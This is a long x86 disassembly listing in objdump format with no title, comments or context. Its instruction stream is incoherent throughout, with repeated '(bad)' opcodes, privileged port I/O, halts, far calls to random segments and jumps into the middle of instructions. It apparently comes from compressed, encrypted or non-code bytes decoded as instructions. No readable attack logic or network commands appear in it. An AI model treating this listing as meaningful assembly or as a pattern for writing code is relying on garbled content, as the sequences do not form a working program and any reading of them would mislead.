  402185:	xlat   BYTE PTR ds:[ebx]
  402186:	xor    DWORD PTR [esi],eax
  402188:	sbb    ch,BYTE PTR [ebx+0x77]
  40218b:	mov    ebx,0xd6c7691f
  402190:	call   0xd0219bca
  402195:	pusha  
  402196:	gs popf 
  402198:	push   ebp
  402199:	jno    0x40212d
  40219b:	push   esp
  40219c:	cmp    al,0xea
  40219e:	add    eax,0x655ab029
  4021a3:	sbb    al,dh
  4021a5:	jle    0x4021e2
  4021a7:	ret    0xb858
  4021aa:	push   0x2142e927
  4021af:	outs   dx,BYTE PTR ds:[esi]
  4021b0:	or     DWORD PTR [ecx+eax*2+0x594d7e92],0xffffffbc
  4021b8:	jb     0x40220e
  4021ba:	xor    al,0xed
  4021bc:	jg     0x402167
  4021be:	push   esi
  4021bf:	cmp    edi,DWORD PTR [edi*1+0x7e3be776]
  4021c6:	scas   al,BYTE PTR es:[edi]
  4021c7:	ds inc ebx
  4021c9:	pop    ss
  4021ca:	test   eax,0x6574b00e
  4021cf:	dec    edi
  4021d0:	jb     0x402238
  4021d2:	cmp    eax,0x7318ba1c
  4021d7:	sub    bl,BYTE PTR [ecx]
  4021d9:	cs out 0x24,al
  4021dc:	add    edi,edx
  4021de:	int    0x38
  4021e0:	inc    esp
  4021e1:	call   0xc6ac:0xd0654e6c
  4021e8:	ja     0x4021e9
  4021ea:	scas   al,BYTE PTR es:[edi]
  4021eb:	or     BYTE PTR [ecx-0x15c4600],0x53
  4021f2:	hlt    
  4021f3:	shr    BYTE PTR [edi-0x604558a8],cl
  4021f9:	jnp    0x402202
  4021fb:	scas   eax,DWORD PTR es:[edi]
  4021fc:	add    BYTE PTR [ebx+0x11],ch
  4021ff:	imul   ecx,DWORD PTR [esi+eiz*2+0x69],0xffffffa4
  402204:	or     al,0x3f
  402206:	std    
  402207:	lods   eax,DWORD PTR ds:[esi]
  402208:	leave  
  402209:	fidiv  WORD PTR [edi-0x385173f5]
  40220f:	popf   
  402210:	popa   
  402211:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402212:	sahf   
  402213:	cmp    DWORD PTR [ebx-0x2],0x7f62dab0
  40221a:	and    al,0x2a
  40221d:	loopne 0x402253
  40221f:	mov    esp,ebx
  402221:	fild   WORD PTR [edx+0x38dcc8d1]
  402227:	lods   al,BYTE PTR ds:[esi]
  402228:	rol    DWORD PTR [ebx],cl
  40222a:	leave  
  40222b:	ja     0x402282
  40222d:	inc    ebx
  40222e:	mov    bh,0xc7
  402230:	mov    eax,ds:0xe4802dd6
  402235:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402236:	ret    0x8423
  402239:	cmp    eax,0x5e36c928
  40223e:	pusha  
  40223f:	jae    0x4022ad
  402241:	or     cl,BYTE PTR [ebx-0x66]
  402244:	sbb    al,0xd5
  402246:	cld    
  402247:	mov    ebp,0xf6c72af6
  40224c:	mov    ah,0x24
  40224e:	pop    edi
  40224f:	ret    0x8a9e
  402252:	add    eax,0x6a034341
  402257:	push   es
  402258:	shl    ah,cl
  40225a:	stc    
  40225b:	mov    bl,0x9a
  40225d:	push   edx
  40225e:	addr16 or al,0x9b
  402261:	mov    es,ebp
  402263:	sub    esp,DWORD PTR [edi-0x76223ad0]
  402269:	cdq    
  40226a:	leave  
  40226b:	xor    DWORD PTR [eax+0x16],eax
  40226e:	or     al,0xf1
  402270:	push   edi
  402271:	mov    dh,0xdb
  402273:	imul   DWORD PTR [ebp+0x3a]
  402276:	dec    ebp
  402277:	daa    
  402278:	shl    ch,1
  40227a:	aaa    
  40227b:	jmp    0x40220c
  40227d:	push   ds
  40227e:	dec    eax
  40227f:	addr16 sbb al,0xe0
  402282:	jae    0x402222
  402284:	pop    ebp
  402285:	sar    DWORD PTR ds:0xd1de5281,0x1f
  40228c:	lock sub DWORD PTR [edi+esi*8],ebp
  402290:	aad    0x18
  402292:	mov    al,0x49
  402294:	push   es
  402295:	hlt    
  402296:	inc    ebp
  402297:	dec    edi
  402298:	jp     0x4022c4
  40229a:	dec    BYTE PTR [ecx+0x37]
  40229d:	push   ebp
  40229e:	inc    ecx
  40229f:	and    al,0xe6
  4022a1:	pop    esi
  4022a2:	sbb    ebx,esi
  4022a4:	leave  
  4022a5:	cs mov ebp,0xf50811c3
  4022ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4022ac:	test   DWORD PTR [eax+0x16a0054c],esi
  4022b2:	xchg   edi,eax
  4022b3:	idiv   edi
  4022b5:	or     BYTE PTR [ecx+0x60],ch
  4022b8:	iret   
  4022b9:	enter  0xda5b,0xe6
  4022bd:	push   edi
  4022be:	(bad)  
  4022bf:	mov    esp,0xaab75266
  4022c4:	je     0x402324
  4022c6:	call   0x7097:0xd2bbbb97
  4022cd:	mov    cl,0x15
  4022cf:	out    dx,eax
  4022d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4022d1:	adc    eax,DWORD PTR [esi-0x12b75ac5]
  4022d7:	out    0x33,al
  4022d9:	mov    ecx,0xfdfffd98
  4022de:	in     al,dx
  4022df:	push   edx
  4022e0:	enter  0x4099,0x9
  4022e4:	mov    eax,0xcb08d54c
  4022e9:	jmp    0x4022f4
  4022eb:	es inc ebx
  4022ed:	dec    edi
  4022ee:	stc    
  4022ef:	sar    BYTE PTR [eax],cl
  4022f1:	pushf  
  4022f2:	leave  
  4022f3:	mov    ds:0x660e48a6,eax
  4022f8:	or     dh,BYTE PTR [ecx]
  4022fa:	push   cs
  4022fb:	loope  0x40229a
  4022fd:	icebp  
  4022fe:	je     0x4022f0
  402300:	add    ebp,esp
  402302:	(bad)  
  402303:	adc    ebp,DWORD PTR [eax]
  402305:	xchg   edi,eax
  402306:	mov    ah,0xa3
  402308:	jle    0x4022ba
  40230a:	xor    dl,BYTE PTR [ebp-0x6b]
  40230d:	mov    dl,BYTE PTR [ecx]
  40230f:	in     eax,0xd
  402311:	mov    fs,WORD PTR [esp+eiz*8]
  402314:	aad    0x5b
  402316:	ficom  WORD PTR [ebp+0x1e]
  402319:	xchg   BYTE PTR [ebx-0x39ec6256],ah
  40231f:	fwait
  402320:	mov    eax,ds:0xbf7b537
  402325:	fs adc eax,0x6d4dd805
  40232b:	jmp    0x55d7782f
  402330:	xchg   ebp,eax
  402331:	mov    esp,0x3798fe6c
  402336:	mov    bl,0x94
  402338:	div    DWORD PTR [esi]
  40233a:	and    eax,0x2d7c1081
  40233f:	xor    DWORD PTR [edi],edx
  402341:	xor    al,0x71
  402343:	or     DWORD PTR [eax],edi
  402345:	je     0x4022ec
  402347:	ins    DWORD PTR es:[edi],dx
  402348:	(bad)  ds:0x9920306e
  40234e:	cwde   
  40234f:	enter  0xb5ee,0xa0
  402353:	(bad)  
  402354:	out    dx,al
  402355:	xchg   DWORD PTR [eax],ebp
  402357:	retf   
  402358:	or     BYTE PTR [ecx-0x6b],dl
  40235b:	out    dx,al
  40235c:	mov    eax,0x258c6897
  402361:	jmp    0xb8b22a13
  402366:	call   0x3d2c9ca8
  40236b:	stos   BYTE PTR es:[edi],al
  40236c:	cs int3 
  40236e:	jecxz  0x402314
  402370:	dec    eax
  402371:	push   ss
  402372:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402373:	aas    
  402374:	pop    ebx
  402375:	mov    BYTE PTR [ecx+eiz*2-0x2a],dl
  402379:	retf   
  40237a:	push   es
  40237b:	sbb    DWORD PTR [ebp-0x38],0x9081906f
  402382:	shl    BYTE PTR [edx-0x103b3a7b],1
  402388:	sar    BYTE PTR [ebp-0x3f758856],cl
  40238e:	cwde   
  40238f:	repnz sbb eax,ebx
  402392:	ins    BYTE PTR es:[edi],dx
  402393:	stos   BYTE PTR es:[edi],al
  402394:	jnp    0x402325
  402396:	std    
  402397:	sub    bl,BYTE PTR [eax-0x7]
  40239a:	add    al,0xd9
  40239c:	dec    edx
  40239d:	out    0x4d,eax
  40239f:	js     0x4023f4
  4023a1:	and    ebp,DWORD PTR [edi+0x54]
  4023a4:	fistp  DWORD PTR [ebx-0x27e85365]
  4023aa:	loopne 0x402423
  4023ac:	push   ds
  4023ad:	push   cs
  4023ae:	imul   ecx,eax,0x9a6a40a1
  4023b4:	inc    esi
  4023b5:	wbinvd 
  4023b7:	or     eax,0x8eeb15c8
  4023bc:	sub    edx,esp
  4023be:	loop   0x40241a
  4023c0:	out    dx,al
  4023c1:	(bad)
  4023c6:	stos   BYTE PTR es:[edi],al
  4023c7:	in     al,0xc4
  4023c9:	mov    esp,0x5562bef3
  4023ce:	stos   DWORD PTR es:[edi],eax
  4023cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4023d0:	lea    esp,[esi]
  4023d2:	pop    ecx
  4023d3:	push   0x8fb431f3
  4023d8:	loop   0x4023c5
  4023da:	dec    esi
  4023db:	pop    ecx
  4023dc:	push   ecx
  4023dd:	add    BYTE PTR [ecx*2+0x5eb2f1d4],0xb2
  4023e5:	pop    es
  4023e6:	call   DWORD PTR [eax]
  4023e8:	dec    eax
  4023e9:	ds hlt 
  4023eb:	pop    ecx
  4023ec:	xchg   edi,eax
  4023ed:	scas   al,BYTE PTR es:[edi]
  4023ee:	(bad)  
  4023ef:	int    0x1c
  4023f1:	into   
  4023f2:	jg     0x40242a
  4023f4:	mov    esp,0xf8b9aae1
  4023f9:	out    0x6a,eax
  4023fb:	(bad)  
  4023fd:	mov    ebp,DWORD PTR [esi-0x31]
  402400:	sub    al,0xf7
  402402:	xchg   edi,eax
  402403:	data16 cld 
  402405:	jae    0x402395
  402407:	lods   eax,DWORD PTR ds:[esi]
  402408:	lock cmp al,0xff
  40240b:	clc    
  40240c:	sbb    DWORD PTR [ebp-0x72],ebp
  40240f:	fldlg2 
  402411:	mov    eax,0x5f0798a0
  402416:	pop    eax
  402417:	mov    eax,ds:0x98e35235
  40241c:	fs push ebx
  40241e:	std    
  40241f:	aad    0xbb
  402421:	sbb    eax,0x4b36e8a0
  402426:	xchg   ecx,eax
  402427:	jmp    0xf08e094c
  40242c:	and    bh,BYTE PTR [edx-0xd397b32]
  402432:	inc    esi
  402433:	add    ch,BYTE PTR [eax]
  402435:	sub    BYTE PTR [ebx+0x1ad33ba8],0x39
  40243c:	adc    ecx,DWORD PTR [edx]
  40243e:	xchg   DWORD PTR [eax-0x3],esi
  402441:	and    edi,DWORD PTR [ecx+edx*8+0x70]
  402445:	mov    ds:0x14af4085,eax
  40244a:	mov    esi,fs
  40244c:	out    dx,al
  40244d:	repnz dec esi
  40244f:	mov    ebx,0xd56478c4
  402454:	pop    edi
  402455:	jg     0x40249c
  402457:	jb     0x402468
  402459:	xchg   DWORD PTR [edx-0x3640cd96],esp
  40245f:	pop    ebp
  402460:	out    0xa9,eax
  402462:	cmp    eax,0xe6b8e394
  402467:	stos   BYTE PTR es:[edi],al
  402468:	hlt    
  402469:	jecxz  0x4024d2
  40246b:	fisubr DWORD PTR [esi-0x10e3a8fd]
  402471:	mov    bl,0xe8
  402473:	in     eax,dx
  402474:	xlat   BYTE PTR ds:[ebx]
  402475:	jb     0x4024af
  402477:	sbb    al,0xf4
  402479:	(bad)  
  40247b:	ret    0xff7c
  40247e:	add    eax,0xe2a3971e
  402483:	ret    
  402484:	sub    DWORD PTR [ecx],ebx
  402486:	cwde   
  402487:	xor    al,0xab
  402489:	clc    
  40248a:	lock cld 
  40248c:	push   ds
  40248d:	jecxz  0x4024f2
  40248f:	in     al,dx
  402490:	iret   
  402491:	or     al,0xe8
  402493:	dec    edi
  402494:	xchg   ebp,eax
  402495:	pop    esi
  402496:	and    al,0x83
  402498:	jp     0x402435
  40249a:	aaa    
  40249b:	and    al,0xee
  40249d:	fisub  DWORD PTR [eax-0x16]
  4024a0:	adc    eax,0x5bdbae86
  4024a5:	test   BYTE PTR [edi+esi*2-0x31],bh
  4024a9:	test   ch,dl
  4024ab:	sbb    eax,ecx
  4024ad:	mov    bl,0xa6
  4024af:	popa   
  4024b0:	or     DWORD PTR [eax-0xf],ebp
  4024b3:	adc    al,0xe1
  4024b5:	sbb    al,bl
  4024b7:	pop    esi
  4024b8:	scas   al,BYTE PTR es:[edi]
  4024b9:	enter  0x6d96,0xc2
  4024bd:	leave  
  4024be:	inc    ebp
  4024bf:	xor    DWORD PTR [ebx-0x41a55fb9],0xffffffa1
  4024c6:	in     al,0x18
  4024c8:	scas   al,BYTE PTR es:[edi]
  4024c9:	mov    eax,0xf1ccf6b8
  4024ce:	mov    al,ds:0xbcd8e392
  4024d3:	fstp   QWORD PTR [edx+edi*2-0x51]
  4024d7:	scas   al,BYTE PTR es:[edi]
  4024d8:	pushf  
  4024d9:	mov    ds:0xfbd2d65a,eax
  4024de:	push   ds
  4024df:	push   ebx
  4024e0:	inc    eax
  4024e1:	test   eax,ecx
  4024e3:	and    eax,0x1e23d5f2
  4024e8:	mov    dh,0xfc
  4024ea:	pop    ebp
  4024eb:	add    ebp,DWORD PTR [ecx]
  4024ed:	push   ss
  4024ee:	xor    BYTE PTR [ecx-0x2f],bh
  4024f1:	xor    BYTE PTR [ebx-0x539dd2b5],dh
  4024f7:	push   esp
  4024f8:	das    
  4024f9:	jno    0x4024f0
  4024fb:	std    
  4024fc:	test   al,0xf2
  4024fe:	clc    
  4024ff:	rcl    BYTE PTR [edx+ebp*1+0x1],0x15
  402504:	mov    bl,0x14
  402506:	mov    ebp,0xb5357f18
  40250b:	or     BYTE PTR [edi-0x57],dl
  40250e:	jmp    0x5d92:0x972adcad
  402515:	jp     0x402519
  402517:	addr16 std 
  402519:	xchg   esp,eax
  40251a:	pusha  
  40251b:	add    DWORD PTR [edx-0x64ce928f],0x3e7cfc70
  402525:	test   BYTE PTR [ebx-0x5],dl
  402528:	(bad)  
  402529:	mov    al,0xf4
  40252b:	stos   DWORD PTR es:[edi],eax
  40252c:	out    dx,al
  40252d:	cwde   
  40252e:	adc    eax,0xf561f433
  402533:	daa    
  402534:	out    0xed,al
  402536:	jp     0x402594
  402538:	and    bl,BYTE PTR [esi-0x14]
  40253b:	dec    esi
  40253c:	sbb    DWORD PTR [esi+0x14448840],ebx
  402542:	cmp    WORD PTR [ebx+0x33],cx
  402546:	loopne 0x40251d
  402548:	popf   
  402549:	imul   esi,edi,0x5
  40254c:	jp     0x402552
  40254e:	mov    cl,BYTE PTR [esi]
  402550:	ja     0x4024e0
  402552:	test   al,0x4
  402554:	mov    WORD PTR [edi+0x527a4137],ds
  40255a:	lds    edx,FWORD PTR [edx-0x23c8faf3]
  402560:	leave  
  402561:	loope  0x402578
  402563:	pop    ebx
  402564:	sti    
  402565:	aad    0xb4
  402567:	pop    eax
  402568:	pop    ebp
  40256a:	lahf   
  40256b:	or     eax,0x9b85dca0
  402570:	ins    DWORD PTR es:[edi],dx
  402571:	js     0x4025ed
  402573:	test   DWORD PTR [edi],0xd44ff5ae
  402579:	(bad)  
  40257a:	push   edi
  40257b:	mov    DWORD PTR [ebp-0x76bb4c64],esi
  402581:	mov    ah,bl
  402583:	sbb    eax,0x229fdf2
  402588:	and    eax,DWORD PTR [eax+0x663093aa]
  40258e:	cmp    eax,0xbe22063b
  402593:	(bad)
  402598:	lods   eax,DWORD PTR ds:[esi]
  402599:	sti    
  40259a:	or     edi,DWORD PTR [ebp-0x6e]
  40259d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40259e:	fisubr WORD PTR ds:0x5da3048f
  4025a4:	test   BYTE PTR [eax-0x48],dh
  4025a7:	adc    BYTE PTR [ebp-0x61e23535],cl
  4025ad:	sub    BYTE PTR [ebx+esi*8+0x6a],ah
  4025b1:	fs cld 
  4025b3:	xchg   esi,eax
  4025b4:	fsubr  DWORD PTR [eax+edi*8-0x3e590b81]
  4025bb:	jae    0x4025ce
  4025bd:	adc    esp,DWORD PTR [eax]
  4025bf:	jg     0x40262e
  4025c1:	mov    dl,0x8f
  4025c3:	stos   DWORD PTR es:[edi],eax
  4025c4:	jle    0x40258a
  4025c6:	push   edx
  4025c7:	int3   
  4025c8:	je     0x402622
  4025ca:	in     eax,0x61
  4025cc:	mov    eax,0xae9f30b0
  4025d1:	or     al,0xd9
  4025d3:	mov    ebp,0xcbe9d7f9
  4025d8:	je     0x402606
  4025da:	data16 sbb BYTE PTR [ebx],ah
  4025dd:	(bad)  
  4025de:	rcl    esp,cl
  4025e0:	sbb    eax,0x56ac7dca
  4025e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4025e6:	nop
  4025e7:	repz es in al,0xa2
  4025eb:	cmp    edx,esi
  4025ed:	lea    ebp,[edx]
  4025ef:	pop    edx
  4025f0:	pinsrw mm3,WORD PTR [ebx],0x99
  4025f4:	ror    BYTE PTR [ecx],1
  4025f6:	or     edi,DWORD PTR [ecx+0x73]
  4025f9:	xor    DWORD PTR [eax+0x4f],ecx
  4025fc:	pop    ebp
  4025fd:	jge    0x40264c
  4025ff:	test   esi,0x8fec3194
  402605:	mov    dh,0x2
  402607:	not    BYTE PTR [esi-0x63]
  40260a:	(bad)  
  40260b:	iret   
  40260c:	jnp    0x402673
  40260e:	aaa    
  40260f:	dec    eax
  402610:	push   ecx
  402611:	test   eax,0x217233aa
  402616:	sar    BYTE PTR [ebx+0x52],0xc8
  40261a:	fs xchg edx,eax
  40261c:	es mov ebx,0x8b1d6f72
  402622:	fnstcw WORD PTR [edx]
  402624:	popf   
  402625:	stos   BYTE PTR es:[edi],al
  402626:	outs   dx,DWORD PTR ds:[esi]
  402627:	mov    ebx,0x439b2c66
  40262c:	or     DWORD PTR [ebx],esp
  40262e:	inc    esp
  40262f:	push   ss
  402630:	shr    BYTE PTR [edi+0xf],1
  402633:	outs   dx,BYTE PTR ds:[esi]
  402634:	add    DWORD PTR [ebx+0x36],edi
  402637:	adc    DWORD PTR [ebx-0x63],eax
  40263a:	in     al,0x22
  40263c:	or     al,0x91
  40263e:	cmp    esp,esi
  402640:	jmp    0xf6c:0x1d2de232
  402647:	mov    dl,0xb2
  402649:	call   0x34a7:0xd9392ad2
  402650:	call   0xd9ef:0xef8094bd
  402657:	int3   
  402658:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402659:	int    0x76
  40265b:	pop    esp
  40265c:	push   cs
  40265d:	test   DWORD PTR [esi+edi*2+0x31c2ce33],0x5e25ef7b
  402668:	add    cl,dl
  40266a:	ror    DWORD PTR [ecx+0x5f],1
  40266d:	stc    
  40266e:	push   esi
  40266f:	cld    
  402670:	mov    gs,eax
  402672:	jbe    0x402687
  402674:	aas    
  402675:	std    
  402676:	les    edx,FWORD PTR [edi-0x432259f8]
  40267c:	dec    esi
  40267d:	cmp    ah,BYTE PTR [esi+0x1e]
  402680:	aad    0x45
  402682:	ss mov dh,0x1f
  402685:	fwait
  402686:	in     eax,0x59
  402688:	ins    BYTE PTR es:[edi],dx
  402689:	adc    al,0xfa
  40268b:	jmp    0x1ec:0x86aa1b5a
  402692:	(bad)  
  402694:	pusha  
  402695:	addr16 mov bh,0x8e
  402698:	pop    ebp
  402699:	dec    ecx
  40269a:	jo     0x4026fc
  40269c:	aad    0x58
  40269e:	aas    
  40269f:	mov    bl,0x44
  4026a1:	and    al,0xcd
  4026a3:	mov    esp,0xf384cf35
  4026a8:	cmc    
  4026a9:	adc    bh,BYTE PTR [eax-0x68639098]
  4026af:	scas   eax,DWORD PTR es:[edi]
  4026b0:	lds    ebp,FWORD PTR [eax+0x4691602e]
  4026b6:	jns    0x402655
  4026b8:	in     al,dx
  4026b9:	cmp    eax,0x95fe23f6
  4026be:	xor    eax,0x3d
  4026c1:	les    ebp,FWORD PTR [esi]
  4026c3:	jnp    0x402649
  4026c5:	jg     0x402697
  4026c7:	mov    edx,0x7e6cdd05
  4026cc:	jno    0x4026d6
  4026ce:	(bad)  
  4026cf:	mov    ebp,0x1ae28b47
  4026d4:	jg     0x4026c0
  4026d6:	ret    
  4026d7:	adc    al,0xbd
  4026d9:	loop   0x4026bc
  4026db:	enter  0xc3d8,0x74
  4026df:	mov    edx,0x1f6a8628
  4026e4:	stos   BYTE PTR es:[edi],al
  4026e5:	mov    ecx,0x94f46115
  4026ea:	adc    eax,0x27051036
  4026ef:	or     cl,BYTE PTR [ebp-0x4c]
  4026f2:	mov    ecx,DWORD PTR [ecx+0x5846eacb]
  4026f8:	sbb    esp,ecx
  4026fa:	mov    ch,0x40
  4026fc:	stos   DWORD PTR es:[edi],eax
  4026fd:	aam    0xd2
  4026ff:	sbb    eax,0x306b634b
  402704:	test   DWORD PTR [ecx-0x6bf8f864],ebx
  40270a:	push   ss
  40270b:	fadd   QWORD PTR [edi-0x4f48fb8]
  402711:	jge    0x4026aa
  402713:	test   eax,0x7ffde706
  402718:	clc    
  402719:	xchg   esi,eax
  40271a:	lahf   
  40271b:	push   ebx
  40271c:	push   ebp
  40271d:	bound  ebx,QWORD PTR [edx+0x7b]
  402720:	scas   al,BYTE PTR es:[edi]
  402721:	jecxz  0x4026fa
  402723:	mov    eax,fs
  402725:	loopne 0x402738
  402727:	mov    DWORD PTR [esi-0x3],ebx
  40272a:	out    0xb1,al
  40272c:	push   edi
  40272d:	jb     0x40277b
  40272f:	cmp    eax,0x362a4479
  402734:	xchg   ecx,eax
  402735:	xchg   ebx,eax
  402736:	pop    edi
  402737:	mov    eax,ds:0x57e0263
  40273c:	adc    al,0x9f
  40273e:	scas   al,BYTE PTR es:[edi]
  40273f:	(bad)  
  402740:	adc    al,0xad
  402742:	push   es
  402743:	hlt    
  402744:	or     al,0xe
  402746:	pop    es
  402747:	mov    edx,0xe5b70802
  40274c:	cmp    edi,esi
  40274e:	enter  0xc94f,0xc7
  402752:	mov    ah,0xdf
  402754:	cmp    al,0x6c
  402756:	pop    ds
  402757:	sbb    dh,ch
  402759:	sar    eax,0x81
  40275c:	je     0x40274d
  40275e:	out    0xa3,al
  402760:	jmp    0x8324e2c6
  402765:	pop    ss
  402766:	pop    eax
  402767:	sbb    cl,BYTE PTR [ebx]
  402769:	or     DWORD PTR [ebx+0x5d33ca70],esi
  40276f:	rol    DWORD PTR [edx+0x1f],0x6f
  402773:	cwde   
  402774:	jg     0x402765
  402776:	fsub   st(7),st
  402778:	mov    ebp,0xd237cc34
  40277d:	adc    al,0xa7
  40277f:	sub    DWORD PTR [eax+0x2af515fe],eax
  402785:	ficom  WORD PTR [ebp+eax*8+0x66b74c93]
  40278c:	pop    ss
  40278d:	xor    WORD PTR [ecx],bx
  402790:	cmp    BYTE PTR [edi+0x3f],0x4d
  402794:	(bad)  
  402795:	setae  BYTE PTR [eax+edx*8]
  402799:	dec    ebp
  40279a:	and    dh,dl
  40279c:	mov    ah,0x48
  40279e:	sbb    eax,esp
  4027a0:	sub    eax,0x4bb50bb6
  4027a5:	or     al,0x7f
  4027a7:	jno    0x4027e0
  4027a9:	jmp    0xc27c17a2
  4027ae:	iret   
  4027af:	imul   BYTE PTR [esi+0x3bd7e637]
  4027b5:	out    0x8d,al
  4027b7:	xor    BYTE PTR [eax+0x2fcf9436],0x67
  4027be:	pop    esi
  4027bf:	push   0x2c
  4027c1:	pop    ecx
  4027c2:	out    0x4,eax
  4027c4:	imul   esi,DWORD PTR [edx],0xd8550cb9
  4027ca:	ror    esi,cl
  4027cc:	xchg   edx,eax
  4027cd:	cmp    eax,0x62a91800
  4027d2:	inc    ecx
  4027d3:	stos   DWORD PTR es:[edi],eax
  4027d4:	xchg   ecx,eax
  4027d5:	push   esi
  4027d6:	xchg   edx,eax
  4027d7:	js     0x4027e0
  4027d9:	in     al,dx
  4027da:	sub    dh,BYTE PTR ds:0xdf9b1a41
  4027e0:	hlt    
  4027e1:	pop    esi
  4027e2:	test   al,0xb
  4027e4:	sub    dh,BYTE PTR [ebp+0x57fd2245]
  4027ea:	and    DWORD PTR [ebx],edi
  4027ec:	lds    ebx,FWORD PTR ds:0x5b06fbd5
  4027f2:	fidivr WORD PTR [ebx]
  4027f4:	xor    BYTE PTR [edi+0x75abb1e8],bh
  4027fa:	cdq    
  4027fb:	stos   DWORD PTR es:[edi],eax
  4027fc:	xchg   edi,eax
  4027fd:	mov    al,ds:0x4f0179c7
  402802:	pop    esi
  402803:	push   ebp
  402804:	cwde   
  402805:	fild   DWORD PTR [edi+0x7a]
  402808:	push   ds
  402809:	dec    ebx
  40280a:	in     al,0x85
  40280c:	xchg   esp,eax
  40280d:	mov    bl,0x68
  40280f:	out    0x81,al
  402811:	popf   
  402812:	dec    ebx
  402813:	jae    0x402815
  402815:	sar    DWORD PTR [ecx+0x19868562],cl
  40281b:	in     eax,0x35
  40281d:	mov    ecx,0xf86a5039
  402822:	push   ss
  402823:	cmp    al,0x3c
  402825:	repnz adc BYTE PTR [esi+0x59],0x86
  40282a:	dec    edx
  40282b:	test   DWORD PTR [eax-0x65],0x49b41ff2
  402832:	int3   
  402833:	dec    edx
  402834:	loope  0x402809
  402836:	jg     0x402848
  402838:	jmp    0x1024:0x33dc0f27
  40283f:	loope  0x402882
  402841:	lods   eax,DWORD PTR ds:[esi]
  402842:	jne    0x402836
  402844:	inc    esp
  402845:	mov    ch,0xf8
  402847:	je     0x4028bc
  402849:	mov    edi,DWORD PTR [eax+0x3ebdd577]
  40284f:	les    esp,FWORD PTR [eax]
  402851:	outs   dx,DWORD PTR ds:[esi]
  402852:	jecxz  0x4028cd
  402854:	mov    dl,0xa1
  402856:	jecxz  0x402881
  402858:	lods   al,BYTE PTR ds:[esi]
  402859:	in     al,dx
  40285a:	out    0x82,al
  40285c:	mov    al,ds:0x31125e0f
  402861:	jmp    0x4027eb
  402863:	fstp   TBYTE PTR [ecx-0x145a26d5]
  402869:	repnz test DWORD PTR [edx-0x643ced65],edi
  402870:	push   ecx
  402871:	and    eax,0x94544978
  402876:	jbe    0x40286f
  402878:	pop    eax
  402879:	lahf   
  40287a:	or     esp,DWORD PTR [edi-0x22b926cd]
  402880:	push   DWORD PTR [ecx-0x68e71562]
  402886:	mov    dl,0x43
  402888:	jbe    0x4028c2
  40288a:	arpl   WORD PTR [edx],bp
  40288c:	push   ebp
  40288d:	fwait
  40288e:	mov    dh,0x91
  402890:	pop    ds
  402891:	xchg   ebp,eax
  402892:	lods   al,BYTE PTR ds:[esi]
  402893:	shr    BYTE PTR gs:[edx-0x19],0xf5
  402898:	dec    edi
  402899:	sbb    bl,dl
  40289b:	adc    al,0x15
  40289d:	lock scas al,BYTE PTR es:[edi]
  40289f:	pop    ss
  4028a0:	ret    
  4028a1:	stos   BYTE PTR es:[edi],al
  4028a2:	mov    ah,BYTE PTR [edi+ebx*2-0x12451d33]
  4028a9:	ss push esi
  4028ab:	xor    cl,BYTE PTR [edi]
  4028ad:	(bad)  
  4028af:	ret    
  4028b0:	in     eax,dx
  4028b1:	dec    ebp
  4028b2:	pop    esp
  4028b3:	and    DWORD PTR [eax],ebp
  4028b5:	jnp    0x402929
  4028b7:	cli    
  4028b8:	add    al,0xad
  4028ba:	aas    
  4028bb:	stc    
  4028bc:	sbb    eax,0x58c9eced
  4028c1:	dec    esi
  4028c2:	xor    cl,dl
  4028c4:	or     al,0xf1
  4028c6:	xlat   BYTE PTR ss:[ebx]
  4028c8:	addr16 mov esp,0x2d21d0bc
  4028ce:	mov    dh,0x3d
  4028d1:	in     al,dx
  4028d2:	outs   dx,BYTE PTR ds:[esi]
  4028d3:	cs stos DWORD PTR es:[edi],eax
  4028d5:	(bad)  
  4028d6:	and    eax,0x2b1b0f4d
  4028db:	jle    0x40286a
  4028dd:	scas   eax,DWORD PTR es:[edi]
  4028de:	mov    ebx,0x863fa762
  4028e3:	mov    ah,0x3a
  4028e5:	es and eax,0x5a472452
  4028eb:	mov    ds:0x7054821e,al
  4028f0:	shl    ebx,1
  4028f2:	call   0x74e7:0xf226912a
  4028f9:	sbb    al,0x6
  4028fb:	cmp    ch,BYTE PTR [ebx+0x36591112]
  402901:	shr    BYTE PTR [ebx],0xaa
  402904:	push   ss
  402905:	push   ebp
  402906:	xor    al,0x66
  402908:	inc    eax
  402909:	sub    eax,eax
  40290b:	loop   0x402976
  40290d:	mov    bh,bl
  40290f:	jmp    0x40296b
  402911:	mov    ebp,0xbb9f3dec
  402916:	out    0x8d,eax
  402918:	aam    0xb4
  40291a:	cmc    
  40291b:	mov    ah,0xd
  40291d:	arpl   WORD PTR [edx+esi*1+0x7203c530],di
  402924:	gs add al,0x7b
  402927:	fmulp  st(2),st
  402929:	push   edx
  40292a:	xor    BYTE PTR [edi+ebp*2+0x509d232e],cl
  402931:	jecxz  0x4029af
  402933:	xchg   dh,al
  402935:	fbld   TBYTE PTR [edx-0x2608a6d4]
  40293b:	adc    al,0x9a
  40293e:	jecxz  0x40298e
  402940:	mov    al,ds:0x85ffa8b8
  402945:	push   0x3e
  402947:	sbb    eax,0x6cfe7ee0
  40294c:	adc    ch,BYTE PTR ds:0xfcf99bd
  402952:	lods   eax,DWORD PTR ds:[esi]
  402953:	cdq    
  402954:	pop    eax
  402955:	call   0x1776:0x58e53a2b
  40295c:	cs push ecx
  40295e:	fnsave [edx]
  402960:	pop    esp
  402961:	mov    ds:0xda5651c1,al
  402966:	dec    ecx
  402967:	sbb    edi,DWORD PTR [edx-0x4a7e50d9]
  40296d:	xchg   esp,eax
  40296e:	pop    esp
  40296f:	test   DWORD PTR [edx+0x3],esi
  402972:	in     eax,dx
  402973:	xor    eax,DWORD PTR [eax+ebx*2+0x25dfadde]
  40297a:	xor    al,0x6f
  40297c:	pop    ds
  40297d:	and    al,0x8
  40297f:	out    0xe3,al
  402981:	int    0xf9
  402983:	ins    DWORD PTR es:[edi],dx
  402984:	jns    0x402976
  402986:	test   BYTE PTR [esi+eiz*4+0x2f],bh
  40298a:	and    esi,DWORD PTR [eax-0x5f]
  40298d:	pop    ebx
  40298e:	xor    eax,0xb75182fd
  402993:	and    al,0x65
